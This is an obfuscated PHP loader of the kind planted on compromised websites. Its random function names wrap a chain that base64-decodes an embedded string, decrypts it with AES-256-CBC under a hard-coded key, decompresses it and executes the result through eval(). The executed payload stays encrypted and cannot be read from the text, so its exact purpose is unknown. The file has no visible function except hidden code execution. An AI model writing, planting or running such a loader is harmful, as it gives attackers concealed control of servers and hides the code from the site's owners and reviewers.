<?php function UvZPBbed($x){return base64_decode($x);} function MAVpDumR($data,$key){$iv=substr(sha1($key),0,16);return openssl_decrypt($data,'AES-256-CBC',$key,0,$iv);} $dDIVjENQ="Nk8rSXFCTjFtdWUzbGFZTGloaUVhUDZ4TDN1a1o5N2FpdE1zK0NIQjI4SkhSc3AzV2xHL0NJd1A4bUpIOHVHMzo6NzFkOGIwMDhkNDM0YmM3MWFhYWYxYzU0YmZkMGU3ODAyNWEyNTQ1OTRhZTA3NjY1YmZkODU0MmFkODgzOTJhOA=="; $WBVNSwlD=UvZPBbed($dDIVjENQ); list($a,$b)=explode('::',$WBVNSwlD); if($b!==hash('sha256',$a)){die('Signature error');} $decrypted=gzuncompress(MAVpDumR($a,'72f8dc7fdca7208e02f5d8443ef53782376202227be21a705a4a67b247b81067')); eval('?>'.$decrypted); ?>